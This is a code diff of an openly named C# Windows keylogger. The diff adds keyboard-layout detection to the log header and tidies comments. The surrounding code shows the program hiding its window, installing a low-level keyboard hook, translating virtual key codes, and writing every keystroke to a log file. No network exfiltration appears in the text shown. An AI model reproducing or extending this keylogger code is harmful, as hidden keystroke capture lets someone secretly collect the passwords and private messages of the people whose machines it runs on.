@@ -29,15 +29,15 @@ public static class Program
         HideWindow();
         WriteInfoToLogFile();
 
+        // write buffer on process exit
         AppDomain.CurrentDomain.ProcessExit += (_, _) =>
         {
             _kbHook?.Close();
-            // TODO still doesnt write on close
             WriteBuffer();
             Writer.Dispose();
         };
         
-        // TODO something weird going on
+        // TODO check something weird going on
         _capsLockActive = GetCapsLockState();
 
         // install a keyboard hook
@@ -83,9 +83,6 @@ public static class Program
         // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
         // maps most of the virtual key codes to human-readable strings. some that are missing are clearly marked with
         // their code
-        // TODO get locale with GetKeyboardLayout and alter what for example numbers return when shift is active
-        // write the locale to file and only actually alter the keys' behaviour if the kb layout isn't weird with
-        // what shift + numbers do otherwise assume default US kinda keyboard layout
         var stringToWrite = kbStruct->vkCode switch
         {
             0x08 => " [BACKSPACE] ",
@@ -230,6 +227,7 @@ public static class Program
             0xB5 => "\n[SELECT MEDIA] ",
             0xB6 => "\n[START APPLICATION 1] ",
             0xB7 => "\n[START APPLICATION 2] ",
+            // these should be correct for most keyboard layouts?
             0xBA when !_shiftActive => ";",
             0xBA when _shiftActive => ":",
             0xBB => "+",
@@ -257,6 +255,7 @@ public static class Program
         if (kbStruct->vkCode == 0x14) _capsLockActive = !_capsLockActive;
         if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1) _shiftActive = true;
         
+        // check for letters
         if (kbStruct->vkCode >= 0x41 && kbStruct->vkCode <= 0x5A)
         {
             // if either shift or caps are active but not both at the same time
@@ -368,17 +367,30 @@ public static class Program
     {
         if (new FileInfo(PathToFile).Length != 0) return;
 
-        // TODO add kb layout info
         Writer.Write($"https://github.com/schmaldeo/keylogger v{Assembly.GetEntryAssembly()!.GetName().Version} {DateTime.Now}\n\n" +
                           $"If you see something like: [CODE: xxxx], you can check what key the code represents on " +
-                          $"https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\n\n");
+                          $"https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\n\n" +
+                          $"Keyboard layout: {GetKeyboardLayout()}. Find more information about it on: " +
+                          $"https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-LCID/%5bMS-LCID%5d.pdf\n" +
+                          $"The modifier keys only modify the output to this file for the following characters: " +
+                          $"; , . / ` [ ] \\ ', for the other ones like shift + numbers or alt graph + letters, you " +
+                          $"need to find out yourself what keyboard layout it is and then just find out yourself what" +
+                          $"the output was, as you can clearly see when the modifier keys are pressed and released, " +
+                          $"as well as what was typed in while those were active.");
         Writer.Flush();
     }
     
-    private static void GetKeyboardLayout()
+    /// <summary>
+    ///     Gets the keyboard layout returned by GetKeyboardLayout function from user32.dll.
+    /// </summary>
+    /// <returns>
+    ///     Hex string containing the language identifier. You can read more about it here: 
+    ///     https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-LCID/%5bMS-LCID%5d.pdf
+    /// </returns>
+    private static string GetKeyboardLayout()
     {
         var layout = PInvoke.GetKeyboardLayout(0);
         var lcid = layout >> 16;
-        Console.WriteLine($"{lcid:X}");
+        return $"0x{lcid:X4}";
     }
 }
